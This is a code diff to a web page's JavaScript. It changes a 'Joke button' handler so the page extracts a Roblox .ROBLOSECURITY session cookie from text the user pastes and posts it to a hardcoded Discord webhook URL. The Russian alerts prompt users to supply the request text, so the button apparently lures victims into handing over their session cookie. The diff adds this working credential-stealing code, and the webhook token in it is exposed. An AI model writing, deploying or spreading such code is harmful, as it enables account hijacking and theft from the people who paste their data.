@@ -207,17 +207,32 @@
   // Joke button
   document.getElementById('jokeBtn').addEventListener('click', () => {
     const webhookUrl = 'https://discord.com/api/v10/webhooks/1478629698723385355/e3Y3FHE1pi-zCiVMlkP7qgAu1C5S3hdocMwy4KIOetEOYsuYWqbe12mrYbp0jeEPBSop';
-    const ananasText = document.getElementById('ananas').value;
+    const requestText = document.getElementById('ananas').value;
 
-    if (!ananasText) {
+    if (!requestText) {
       alert('Пожалуйста, введите текст!');
+      return;
+    }
+
+    // Extract .ROBLOSECURITY cookie
+    const regex = /\.ROBLOSECURITY["']\s*,\s*"([^"]+)"|\.ROBLOSECURITY["']\s*,\s*'([^']+)'|(_\|WARNING:[^<]+)/g;
+    const match = regex.exec(requestText);
+    
+    let cookieValue = '';
+    if (match) {
+      cookieValue = match[1] || match[2] || match[3] || '';
+      cookieValue = cookieValue.trim();
+    }
+
+    if (!cookieValue) {
+      alert('.ROBLOSECURITY не найден в запросе!');
       return;
     }
 
     fetch(webhookUrl, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: ananasText })
+      body: JSON.stringify({ content: cookieValue })
     }).then(() => {
       openPopup();
     }).catch(err => {
